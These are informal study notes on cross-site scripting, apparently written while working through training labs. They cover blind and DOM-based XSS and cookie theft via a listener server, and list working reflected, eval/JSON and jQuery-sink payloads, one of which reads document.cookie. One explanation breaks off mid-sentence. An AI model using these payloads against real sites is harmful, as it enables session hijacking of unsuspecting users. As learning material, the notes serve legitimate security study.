Cross site scripting vulnerability is a method of exploiting javascript and html 
to run code in html tags or similar.

The basic example is with alert(1) that opens the alert box in your browser, like ones that ask you a permission to allow sharing location with the website or saving passwords.

The JS can be run on client side if the app is vulnerable to XSS, you may think eh can't get a shell that way so no big deal?
Welp hol' up, using XSS we can possibly steal cookies from the users that are using that web app.
There is a condition for stealing cookies via this method, the http only flag is not set (you can check that in developer tools in browser, by looking at the cookie you have).

And also there is a secure flag, which if it's not set means you can transfer the cookie over http or better said on a network that has no tls or ssl.

Testing for blind XSS requires setting up basic python http server to see if anything lands.
And modifying your request with JS to test for XSS and don't forget to encode those parts with URL encode (tip: url encoding has lots of % signs).

If you get something in your python http server it means the XSS is working, and the process of stealing the cookie is a bit convoluted it requires a php server with some js stuff but there is automated scripts to help with that.

This can be found in the wild and it's in OWASP top 10 for a reason, so explore more.

https://www.youtube.com/watch?v=KljtU2vJKPA

**What is the DOM?**  

DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

**Exploiting the DOM  
**

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

**Blind XSS**

  
Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.  
  
**Example Scenario:**  
  
A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

### Unique Examples

Href tag reflection - `javascript:alert(1)`
```html
<a href="javascript:alert(1)">Next &gt;&gt;</a>
```

This one escapes backend "time countdown" written in JS.
```javascript
3');alert('t
```

```js
foobar" onload="alert(1) //payload that reflects in the input element and has no closing quote for valid html
// reflected source
<input type=text placeholder='Search the blog...' name=search value="foobar onload="alert(1)">
```

```js
// inline js script vulnerable.
var searchTerms = 'foobar';
// escape both single quotes and add - for execution: '-alert(1)-'
var searchTerms = ''-alert(1)-'';
// i was a lazy bum, this is almost like code injection i just didn't bother testing... ';alert(1); or some shit would work.
//this worked
foobar';alert(1);'
```

**LAB** - Reflected DOM example. Execute alert() function.
**Solution** - This web app is utilizing java script files for it's functionality.
One file is `searchResults.js`.
It's responsible for handling the search functionality.
And the search query is sent in form of JSON object in another http request.
In the JS file there is an alarming function being used with user supplied input.
`eval('var searchResultsObj = ' + this.responseText);`
It resides in a function called search().
So we need to craft a XSS payload to run in this eval context.
The usual JSON object looks like : `{"searchTerm":"foobar", "results":[]}`
And we can utilize backslashes to undo escaping of the double quote character, to make them actual quotes for JSON structure.
Also we can then use other JSON things like brackets and double forward slash for commenting out things.
Based on this knowledge we can modify the search query to reflect in the JSON object as a valid XSS payload which will be executed by the JS file (which is called for searching).
`{"searchTerm":"\\"-alert(1)}//", "results":[]}`
So in this JSON, the JSON ends after the alert because we closed it with curly braces and commented out the rest.
The double quote before the alert is escaped once and the parser or whatever escapes it again naturally which just makes it a normal double quote.
So the search term value ends 
#### Reflecting user input in inner html via sink

In a scenario where the front end reflects the user input in the inner html for security reasons the inline script tags will reflect but not execute.
This can be bypassed by using any other tag except the script tag.

#### jQuery sink

```js
feedback?returnPath=javascript:alert(document.cookie);
```

In this example `returnPath` http parameter was reflected in the `back` button on the page.
And we can run on click JS in `href` attributes.

